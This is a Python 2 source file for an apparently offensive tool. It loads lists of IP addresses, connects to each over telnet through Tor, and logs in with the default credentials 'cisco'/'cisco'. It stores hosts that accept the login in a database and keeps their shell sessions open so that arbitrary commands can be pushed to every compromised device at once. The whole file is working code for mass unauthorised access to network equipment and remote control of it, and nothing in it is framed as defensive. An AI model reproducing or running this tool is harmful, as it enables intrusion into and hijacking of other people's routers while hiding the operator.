import sqlite3
import os
import sys
import time
from sundries.execSql import *

from multiprocessing import Queue , Process 
from threading import Thread
from tor import Tor
from sundries import color


class Man(Tor,Exec):

	def __init__(self, db):
		db = 'databases/%s.db' % db
		Tor.__init__(self)
		Exec.__init__(self)
		Exec.createDB(self,db)
		self.live = {}
		self.connected = []
		self.details = []
		self.threads = []


	def addHost(self, ip, port,user, password):
		if self.check(ip,port, user, password):
			
			details = (ip.strip('\n'),port,user,password,)
			self.details.append(details) 
			return 1
		else:
			return 0
	def updateDB(self):
		for i in self.details:
			try:
				Exec.insert(self,i)
			except:
				pass
	def check(self, host, port, user, password):
		sock = Tor.newSock(self)
		ip = Tor.getIP(self)
		if host.strip('\n') in self.connected: 
			sys.exit()
		else:
			self.connected.append(host.strip('\n'))
		for i in xrange(3):
			try:
				sock = Tor.newSock(self)
				sock.settimeout(5.0)
				sock.connect( ( host, port ) )
				data = sock.recv(4096)
				while 'login:' not in data and 'Password:' not in data and '>' not in data and '#' not in data:
					data = sock.recv(4096)
					if data is None: return 0
				#	print data

				if 'login:' in data:
					sock.send( '%s\r\n' % user )
					data = sock.recv(1024)
				elif 'Password:' in data:
					sock.send( '%s\r\n' % password )
					data = sock.recv(1024)

				if '>' in data or '#' in data:
					self.live[len(self.live) + 1] = [ '%s -> %s' % ( ip.strip('\n'), host ), sock ]
					print "Logged in to %s -> %s" % ( color.setcolor(ip.strip('\n'),color='red'), color.setcolor(host, color='blue'))
					return 1
				else:
					sock.close()
					return 0
			except Exception, e:
				pass
		return 0
	def execute(self, sess=0, cmd=None,worker=None,done=None):
		if sess is not 0 and cmd is not None:
			print color.setcolor("[+] DATA FROM %s" % self.live[sess][0], color='red')
			self.live[sess][1].send('%s\r\n' % cmd)
			data = self.live[sess][1].recv(4096)
			print '%s %s' % (color.setcolor('[+]',color='green'),data)
			while '>' not in data and '#' not in data:
				print data
				if '--More--' in data:
					self.live[sess][1].send('\r\n')
				data = self.live[sess][1].recv(4096)
				if 'Password:' not in data:
					pword = 'cisco'
					self.live[sess][1].send(pword)
			return True
		elif worker is not None and done is not None:
			try:
				for i in iter(worker.get, 'STOP'):
					self.execute(i[0], i[1])
					done.put("DONE")
			except Exception, e:
				print e
		return 1
	def killSess(self, sess):
		try:
			print '%s Killing Session ID:%s' % (color.setcolor('[+]',color='red'), sess)
			self.live[sess][1].close()
			del self.live[sess]
		except:
			pass
	def list(self):
		sess = []
		for i in self.live:
			print "%s: %s" % (color.setcolor(str(i),color='green'), color.setcolor(str(self.live[i][0]),color='yellow'))
	def load(self,ID=0):
		if ID == 0:
			threads = []
			for row in Exec.selectALL(self):
				t = Thread(target=self.check, args=(str(row[0]),row[1],row[2],row[3]))
				t.start()
		else:	
			host, port, user , password = Exec.getHost(self, ID)
			self.check(str(host), port, user, password)

	def dumpDB(self):
		for i in Exec.selectALL(self,ids=1):
			print color.setcolor(str(i),color='grey')

	def loadfile(self,file):
		threads = []
		if os.path.isfile(file): 
			pass
		else:
			print color.setcolor("%s does not exist" % file, color='red')
			return
		with open(file) as telnet:
			for ip in telnet: threads.append(Thread( target = self.addHost, args=(ip.strip('\n'),23,'cisco','cisco'),))
			for t in threads:t.start()
		#	print "Killing threads"
		#	for t in threads:t.join() 
		return 1
	def execute_all(self,cmd):
		worker = Queue()
		done = Queue()
		processes = []
		procs = 5

		for i in self.live:
			worker.put([i,cmd])
		for w in xrange(procs):
			p = Process(target=self.execute, args=(0, None, worker, done))
			p.start()
			processes.append(p)
			worker.put('STOP')
		for p in processes:
			p.join()
		return 1